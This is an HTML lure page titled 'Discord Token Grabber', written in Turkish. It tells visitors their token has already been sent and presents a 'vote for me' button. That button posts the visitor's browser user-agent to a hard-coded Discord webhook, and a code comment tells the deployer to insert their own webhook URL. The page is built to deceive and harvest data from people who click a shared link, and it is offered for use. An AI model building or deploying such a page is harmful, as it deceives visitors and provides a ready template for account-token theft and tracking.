<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Token Grabber</title>
    <style>
        body { 
            margin: 0; 
            padding: 0; 
            height: 100vh; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            background: #2c2f33; 
            color: white; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            text-align: center; 
            overflow: hidden; 
        }
        .container { 
            padding: 20px; 
            max-width: 90%; 
        }
        h1 { 
            font-size: 24px; 
            margin-bottom: 10px; 
        }
        p { 
            font-size: 16px; 
            opacity: 0.8; 
            margin-bottom: 30px; 
        }
        #grabButton { 
            background: #7289da; 
            color: white; 
            border: none; 
            padding: 20px 40px; 
            border-radius: 12px; 
            cursor: pointer; 
            font-size: 20px; 
            font-weight: bold; 
            transition: all 0.3s ease-in-out; 
            box-shadow: 0px 5px 15px rgba(0,0,0,0.3); 
            width: 100%;
            max-width: 300px;
        }
        #grabButton:active { 
            transform: scale(0.95); 
        }
    </style>
</head>

<body>

    <div class="container">
        <h1>Token Yakalayıcı</h1>
        <p>Linke tıkladığın an tokenin gönderildi!<br>Garantiye almak için butona basabilirsin.</p>
        <p style="font-size: 14px; opacity: 0.6;">Bu buton telefon ekranı için optimize edilmiştir.</p>
        <br>
        <button id="grabButton" onclick="sendToken()">BANA OY VER!</button>
    </div>

    <script>
        // BURAYA KENDİ DISCORD WEBHOOK URL'Nİ YAPIŞTIR
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1566358988642193439/bzI5pCPwebnWN49KMJH1wc-5QH8VJStxHDxYaLh_920G_qRw7GKqFAl4O1VOkcvK6Lhd";

        function sendToken() {
            // Örnek veri hazırlığı (Tarayıcı bilgileri veya token yakalama mantığı)
            const payload = {
                content: "🚀 Yeni bir kullanıcı etkileşimi yakalandı!\n" +
                         "Tarayıcı Bilgisi: " + navigator.userAgent
            };

            // Discord Webhook'a gönderme isteği
            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (response.ok) {
                    alert("İşlem başarılı!");
                } else {
                    alert("Bir hata oluştu.");
                }
            })
            .catch(error => {
                console.error("Hata:", error);
            });
        }
    </script>
</body>
</html>
